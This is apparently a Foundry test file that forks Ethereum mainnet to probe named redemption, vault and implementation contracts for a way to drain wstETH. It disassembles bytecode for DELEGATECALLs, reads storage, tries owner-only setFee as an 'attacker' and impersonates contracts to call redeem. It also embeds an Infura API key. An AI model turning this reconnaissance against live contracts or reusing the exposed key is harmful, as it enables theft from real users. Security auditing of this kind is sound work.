// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract ImplementationDeepDive is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant IMPLEMENTATION = 0x434B68B11bBE8FD3074089397cA3d275801d6354;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckRedemption0Slot1() public view {
        console.log("=== CHECKING REDEMPTION_0 SLOT 1 ===\n");

        bytes32 slot1 = vm.load(REDEMPTION_0, bytes32(uint256(1)));
        console.log("Slot 1:");
        console.logBytes32(slot1);

        address slot1Addr = address(uint160(uint256(slot1)));
        console.log("As address:", slot1Addr);

        if (slot1Addr.code.length > 0) {
            console.log("Has code! Size:", slot1Addr.code.length);

            // Check if this is the delegatecall target
            console.log("\nThis might be the delegatecall target for offset 1262!");
        }
    }

    function test_AnalyzeImplementationBytecode() public view {
        console.log("=== ANALYZING IMPLEMENTATION BYTECODE ===\n");

        bytes memory code = IMPLEMENTATION.code;
        console.log("Implementation code size:", code.length);

        // Find DELEGATECALLs
        console.log("\nDELEGATECALLs in implementation:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);

                // Look for SLOAD before
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) {
                        console.log("  PUSH20 at:", j);
                    }
                }

                // Look for PUSH before
                for (uint j = (i > 20 ? i - 20 : 0); j < i; j++) {
                    uint8 op = uint8(code[j]);
                    if (op >= 0x60 && op <= 0x65) {
                        uint8 size = op - 0x5f;
                        uint256 val = 0;
                        for (uint k = 0; k < size && j + 1 + k < code.length; k++) {
                            val = val << 8 | uint8(code[j + 1 + k]);
                        }
                        console.log("  PUSH at", j, ":", val);
                    }
                }
            }
        }

        // Find what function uses the DELEGATECALLs
        console.log("\nFunction selectors in implementation:");
        bytes4[] memory sels = new bytes4[](20);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length && selCount < 20; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                if (uint32(sel) < 0x1000) continue;

                bool isNew = true;
                for (uint j = 0; j < selCount; j++) {
                    if (sels[j] == sel) {
                        isNew = false;
                        break;
                    }
                }
                if (isNew) {
                    sels[selCount] = sel;
                    selCount++;
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_TryImplementationFunctions() public {
        console.log("=== TRYING IMPLEMENTATION FUNCTIONS ===\n");

        // Try functions from the selectors we found
        // 0xddca3f43, 0x69fe0e2d, 0x781b7e08

        // 0xddca3f43 - fee()
        (bool s1, bytes memory d1) = IMPLEMENTATION.staticcall(
            abi.encodeWithSelector(bytes4(0xddca3f43))
        );
        if (s1 && d1.length >= 32) {
            console.log("0xddca3f43 (fee?):", abi.decode(d1, (uint256)));
        }

        // 0x781b7e08
        (bool s2, bytes memory d2) = IMPLEMENTATION.staticcall(
            abi.encodeWithSelector(bytes4(0x781b7e08))
        );
        if (s2) {
            console.log("0x781b7e08 succeeded, length:", d2.length);
            if (d2.length >= 32) {
                console.logBytes32(bytes32(d2));
            }
        }

        // Try setFee as attacker
        vm.startPrank(attacker);
        (bool s3, bytes memory d3) = IMPLEMENTATION.call(
            abi.encodeWithSignature("setFee(uint256)", 9999)
        );
        console.log("\nsetFee as attacker:", s3);
        if (!s3 && d3.length >= 4) {
            console.logBytes4(bytes4(d3));
        }
        vm.stopPrank();

        // Try setFee as owner
        vm.startPrank(TIMELOCK);
        (bool s4, bytes memory d4) = IMPLEMENTATION.call(
            abi.encodeWithSignature("setFee(uint256)", 9999)
        );
        console.log("setFee as owner:", s4);
        if (!s4 && d4.length >= 4) {
            console.logBytes4(bytes4(d4));
        }
        vm.stopPrank();
    }

    function test_ExploreImplementationDelegatecalls() public view {
        console.log("=== EXPLORING IMPLEMENTATION DELEGATECALLS ===\n");

        bytes memory code = IMPLEMENTATION.code;

        // The implementation has 3 DELEGATECALLs
        // Let's find what storage slots or addresses they use

        console.log("Detailed DELEGATECALL analysis:");

        uint dcCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                dcCount++;
                console.log("\n=== DELEGATECALL #", dcCount);
                console.log("  at offset", i);

                // Dump 50 bytes before the DELEGATECALL
                console.log("50 bytes before:");
                uint start = i > 50 ? i - 50 : 0;
                for (uint j = start; j < i; j++) {
                    uint8 op = uint8(code[j]);

                    if (op == 0x54) console.log(j, "SLOAD");
                    if (op == 0x55) console.log(j, "SSTORE");
                    if (op == 0x33) console.log(j, "CALLER");
                    if (op == 0x36) console.log(j, "CALLDATASIZE");
                    if (op == 0x37) console.log(j, "CALLDATACOPY");
                    if (op == 0x73) console.log(j, "PUSH20");

                    if (op >= 0x60 && op <= 0x7f) {
                        uint8 size = op - 0x5f;
                        uint256 val = 0;
                        for (uint k = 0; k < size && j + 1 + k < code.length; k++) {
                            val = val << 8 | uint8(code[j + 1 + k]);
                        }
                        console.log(j, "PUSH:", val);
                        j += size;
                    }
                }
            }
        }
    }

    function test_CheckImplementationStorageForDelegatecall() public view {
        console.log("=== CHECKING IMPLEMENTATION STORAGE FOR DELEGATECALL ===\n");

        // Check storage slots that might be used as delegatecall targets
        console.log("Implementation storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(IMPLEMENTATION, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (addr.code.length > 0) {
                    console.log("  -> Contract:", addr, "code:", addr.code.length);
                }
            }
        }

        // Check if there's a slot with the Timelock that could be changed
        console.log("\nLooking for mutable targets:");

        // Check pendingOwner
        (bool s, bytes memory d) = IMPLEMENTATION.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s && d.length >= 32) {
            address pending = abi.decode(d, (address));
            console.log("pendingOwner:", pending);
        }
    }

    function test_InvestigateRedemption1FullStorage() public view {
        console.log("=== INVESTIGATING REDEMPTION_1 FULL STORAGE ===\n");

        console.log("REDEMPTION_1 storage slots:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (addr != address(0) && addr.code.length > 0) {
                    console.log("  -> Contract:", addr);
                }
            }
        }
    }

    function test_CanImplementationCallRC() public {
        console.log("=== CHECKING IF IMPLEMENTATION CAN CALL RC ===\n");

        // Check if implementation is registered in RC
        bytes32 key = keccak256(abi.encode(IMPLEMENTATION, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
        console.log("Implementation in RC registry:");
        console.logBytes32(val);

        // Try calling RC.redeem as implementation
        vm.startPrank(IMPLEMENTATION);
        (bool s, bytes memory d) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("\nRC.redeem as implementation:", s);
        if (!s && d.length >= 4) {
            console.logBytes4(bytes4(d));
        }
        vm.stopPrank();

        // Try as REDEMPTION_1 which uses this implementation
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(REDEMPTION_1);
        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("\nRC.redeem as REDEMPTION_1:", s2);
        vm.stopPrank();

        if (s2) {
            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            console.log("*** REDEMPTION_1 CAN DRAIN! ***");
            console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        }
    }

    function test_SearchForCrossContractCall() public view {
        console.log("=== SEARCHING FOR CROSS-CONTRACT CALL PATTERN ===\n");

        // The "action chaining" might involve:
        // 1. Calling contract A which delegatecalls to B
        // 2. B calls C with some manipulation
        // 3. C (like RC) executes the privileged action

        // Let's trace all external calls from REDEMPTION_1
        bytes memory r1Code = REDEMPTION_1.code;

        console.log("REDEMPTION_1 CALL patterns:");

        uint callCount = 0;
        for (uint i = 0; i < r1Code.length; i++) {
            if (uint8(r1Code[i]) == 0xf1) { // CALL
                callCount++;
                console.log("\nCALL #", callCount, "at offset", i);

                // Look for address source
                for (uint j = (i > 30 ? i - 30 : 0); j < i; j++) {
                    uint8 op = uint8(r1Code[j]);
                    if (op == 0x54) console.log("  SLOAD at:", j);
                    if (op == 0x73) console.log("  PUSH20 at:", j);
                }
            }
        }

        // Also check for STATICCALL patterns
        console.log("\n\nREDEMPTION_1 STATICCALL patterns:");
        for (uint i = 0; i < r1Code.length; i++) {
            if (uint8(r1Code[i]) == 0xfa) { // STATICCALL
                console.log("STATICCALL at offset:", i);
            }
        }
    }

    function test_CheckAllRedemptionFunctions() public {
        console.log("=== CHECKING ALL REDEMPTION_1 FUNCTIONS ===\n");

        // From the earlier analysis, REDEMPTION_1 has these selectors:
        // 0x8da5cb5b - owner
        // 0xe30c3978 - pendingOwner
        // 0xf2fde38b - transferOwnership
        // 0x715018a6 - renounceOwnership
        // 0x79ba5097 - acceptOwnership
        // 0xddca3f43 - fee
        // 0x69fe0e2d - setFee
        // 0x781b7e08 - ?

        console.log("Known function results:");

        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(abi.encodeWithSignature("owner()"));
        if (s1) console.log("owner():", abi.decode(d1, (address)));

        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(abi.encodeWithSignature("pendingOwner()"));
        if (s2) console.log("pendingOwner():", abi.decode(d2, (address)));

        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(abi.encodeWithSelector(bytes4(0xddca3f43)));
        if (s3 && d3.length >= 32) console.log("fee():", abi.decode(d3, (uint256)));

        // Try 0x781b7e08
        (bool s4, bytes memory d4) = REDEMPTION_1.staticcall(abi.encodeWithSelector(bytes4(0x781b7e08)));
        if (s4) {
            console.log("0x781b7e08 result length:", d4.length);
            if (d4.length >= 32) {
                console.log("  Value:", abi.decode(d4, (uint256)));
            }
        }

        // Try calling unknown functions
        console.log("\nTrying unknown selectors:");

        bytes4[] memory unknowns = new bytes4[](5);
        unknowns[0] = bytes4(0x43000818);
        unknowns[1] = bytes4(0x388aef5c);
        unknowns[2] = bytes4(0x39967573);
        unknowns[3] = bytes4(0x411557d1);
        unknowns[4] = bytes4(0xb2118a8d);

        for (uint i = 0; i < unknowns.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.staticcall(abi.encodeWithSelector(unknowns[i]));
            if (s && d.length > 0) {
                console.log("Selector succeeded:");
                console.logBytes4(unknowns[i]);
                console.log("  Result length:", d.length);
            }
        }
    }
}
